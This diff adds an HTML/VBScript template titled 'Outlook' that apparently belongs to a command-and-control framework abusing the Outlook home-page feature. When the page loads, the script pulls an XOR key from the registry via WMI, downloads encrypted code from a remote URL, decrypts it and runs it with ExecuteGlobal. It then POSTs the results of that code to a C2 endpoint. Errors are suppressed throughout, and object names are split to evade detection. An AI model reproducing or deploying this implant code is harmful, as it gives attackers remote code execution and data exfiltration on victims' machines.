@@ -1,0 +1,124 @@
+{% autoescape None %}<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta http-equiv="refresh" content="{{ REFRESH_TIME }}">
+<meta http-equiv="Cache-Control" content=NO-CACHE, no-store, must-revalidate, max-age=0" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="EXPIRES" CONTENT="0">
+<title>Outlook</title>
+<style>
+body {
+    overflow: hidden;
+    border: 0px;
+    padding: 0px;
+    margin: 0px;
+}
+</style>
+<script id=clientEventHandlersVBS language=vbscript>
+<!--
+On Error Resume Next
+
+Function Crypt(Inp, Key, Mode)
+    For i = 1 To Len(Inp)
+        Position = Position + 1
+        If Position > Len(Key) Then Position = 1
+        keyZahl = Asc(Mid(Key, Position, 1))
+        If Mode Then
+            orgZahl = Asc(Mid(Inp, i, 1))
+            cptZahl = orgZahl Xor keyZahl
+            cptString = Hex(cptZahl)
+                        If Len(cptString) < 2 Then cptString = "0" & cptString
+                        z = z & cptString
+        Else
+            If i > Len(Inp) \ 2 Then Exit For
+            cptZahl = CByte("&H" & Mid(Inp, i * 2 - 1, 2))
+            orgZahl = cptZahl Xor keyZahl
+            z = z & Chr(orgZahl)
+        End If
+    Next
+    Crypt = z
+End Function
+
+Function Ct(thn, nk, mn)
+	l = Len(thn)
+	Dim j
+	If mn Then
+		ReDim j(l * 2)
+	Else
+		ReDim j(l / 2)
+	End If
+    For i = 1 To l
+        Position = Position + 1
+        If Position > Len(nk) Then Position = 1
+        kZ = Asc(Mid(nk, Position, 1))
+        If mn Then  
+            orZ = Asc(Mid(thn, i, 1))
+            cpt = orZ Xor kZ
+            cptString = Hex(cpt)
+			If Len(cptString) < 2 Then cptString = "0" & cptString
+			j(i) = cptString
+        Else  
+            If i > Len(thn) \ 2 Then Exit For
+            cpt = CByte("&H" & Mid(thn, i * 2 - 1, 2))
+            orZ = cpt Xor kZ
+            j(i) = Chr(orZ)
+        End If
+    Next
+    Ct = Join(j, "")
+End Function
+
+Function gr(Pt,Ve)
+	On Error Resume Next
+	Va = ""
+	Set oL = a.CreateObject("Wbem" & "Scripting.SWbem" & "Locator")
+    Set lr = oL.ConnectServer(".", "root\cimv2").Get("StdRegProv")
+	lr.GetStringValue 2147483649, Pt, Ve, Va
+	gr = Va
+End Function
+
+Function HP(uU, rR)
+	On Error Resume Next
+	vi = Left(a.version,4)
+	d = rR
+	set oP = a.CreateObject("MS" & "XML2.ServerX" & "MLHTTP")
+	oP.open "POST", uU,false
+	oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+	oP.setRequestHeader "Content-Length", Len(d)
+	oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
+	oP.setOption 2, 13056
+	oP.send Replace(d, vbLf, "")
+	HP = oP.responseText
+End Function
+
+Set a = window.external.OutlookApplication
+
+Sub Ie (rl,ey)
+		On Error Resume Next
+		Set orP = a.CreateObject("MSXML2.ServerXMLHTTP")
+		vr = Left(a.version,4)
+		orP.open "GET", rl, False
+		orP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vr
+		orP.send
+		rp = orP.ResponseText
+		xt = Split(rp,vbNewLine)
+		For i = LBound(xt) to UBound(xt)
+			ExecuteGlobal Crypt(xt(i),ey,False)
+		Next
+End Sub
+
+Sub window_onload()
+	Ohm = ""
+	ay = gr({{ENCRYPTIONKEY_LOCATION}}, {{ENCRYPTIONKEY_VALUENAME}})
+	Ie Ct("{{ CODEURL }}",ay,False),ay
+	Ohm = Ct(Eval(Ct("{{ function_name }}",ay,False)),ay,True)
+	rul = HP(Ct("{{ url }}",ay,False), chr(34) & Ohm & chr(34))
+End Sub
+-->
+</script>
+</head>
+
+<body>
+<object classid="CLSID:{{ CLSID }}" id="{{ OUTLOOK_VIEW_ID }}" data="" width="100%" height="100%"></object>
+</body>
+</html>
